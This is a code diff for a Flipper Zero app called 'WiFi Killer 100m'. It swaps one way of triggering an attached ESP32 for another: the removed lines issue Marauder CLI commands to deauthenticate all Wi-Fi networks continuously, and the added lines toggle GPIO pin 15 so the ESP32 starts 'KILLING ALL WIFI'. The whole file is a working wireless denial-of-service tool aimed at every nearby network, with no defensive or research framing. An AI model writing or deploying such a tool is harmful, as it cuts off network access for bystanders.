@@ -1,10 +1,10 @@
 #include <furi.h>
 #include <gui/gui.h>
 #include <input/input.h>
-#include <cli/cli.h>
-#include <furi_hal.h>
+#include <furi_hal_gpio.h>
 
 static bool running = true;
+static const GpioPin* trigger_pin = &gpio_pin_15;
 
 static void input_callback(InputEvent* input, void* ctx) {
     UNUSED(ctx);
@@ -18,38 +18,17 @@ static void draw_callback(Canvas* canvas, void* ctx) {
     canvas_set_font(canvas, FontPrimary);
     canvas_draw_str(canvas, 5, 20, "WiFi Killer 100m");
     canvas_set_font(canvas, FontSecondary);
-    canvas_draw_str(canvas, 5, 40, "CONTINUOUS DEAUTH");
+    canvas_draw_str(canvas, 5, 40, "KILLING ALL WIFI");
     canvas_draw_str(canvas, 5, 55, "Press BACK to stop");
-    canvas_draw_str(canvas, 5, 70, "ESP32-S2: ACTIVE");
-}
-
-// Launch continuous deauth via Marauder CLI
-static void launch_continuous_deauth() {
-    Cli* cli = furi_record_open(RECORD_CLI);
-    if(!cli) {
-        return;
-    }
-    
-    // Send command to Marauder
-    furi_hal_console_tx("marauder deauth -a -c all -l\r\n");
-    furi_delay_ms(200);
-    
-    furi_record_close(RECORD_CLI);
-}
-
-// Stop deauth
-static void stop_deauth() {
-    Cli* cli = furi_record_open(RECORD_CLI);
-    if(!cli) return;
-    
-    furi_hal_console_tx("marauder deauth -s\r\n");
-    furi_delay_ms(100);
-    
-    furi_record_close(RECORD_CLI);
+    canvas_draw_str(canvas, 5, 70, "GPIO Pin 15: HIGH");
 }
 
 int32_t wifi_killer_app(void* p) {
     UNUSED(p);
+    
+    // Set pin as output, default LOW
+    furi_hal_gpio_init(trigger_pin, GpioModeOutputPushPull, GpioPullNo, GpioSpeedLow);
+    furi_hal_gpio_write(trigger_pin, false);
     
     // GUI
     ViewPort* view_port = view_port_alloc();
@@ -58,16 +37,17 @@ int32_t wifi_killer_app(void* p) {
     Gui* gui = furi_record_open(RECORD_GUI);
     gui_add_view_port(gui, view_port, GuiLayerFullscreen);
     
-    // Start continuous deauth
-    launch_continuous_deauth();
+    // Set pin HIGH - trigger ESP32 to start killing
+    furi_hal_gpio_write(trigger_pin, true);
+    furi_delay_ms(100);
     
-    // Main loop - keep running until BACK pressed
+    // Main loop - wait for BACK
     while(running) {
         furi_delay_ms(50);
     }
     
-    // Stop deauth on exit
-    stop_deauth();
+    // Set pin LOW - stop ESP32
+    furi_hal_gpio_write(trigger_pin, false);
     
     // Cleanup
     gui_remove_view_port(gui, view_port);
